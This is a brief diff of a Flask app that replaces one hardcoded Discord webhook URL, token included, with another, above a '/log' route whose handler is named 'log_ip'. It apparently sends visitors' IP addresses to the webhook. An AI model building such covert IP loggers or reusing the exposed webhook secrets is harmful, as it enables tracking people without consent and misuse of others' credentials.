@@ -10,7 +10,7 @@ app = Flask(__name__)
 # Render-Proxy berücksichtigen
 app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1)
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1526282389628915726/HE9Q2YrI1na7ZMQqatS3f5KitCsa9vv0n7gMQ9KmmvtR1tfOgcwBMXkUyqowB0-YQdE8"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1525493036455301200/l58uwVZ7kbagMRObKrGSZSdtsTfTTNoRgSTLfFNsuNfBuQ3kgsgXlzUdP5ncHf0fBzpw"
 
 @app.route("/log")
 def log_ip():
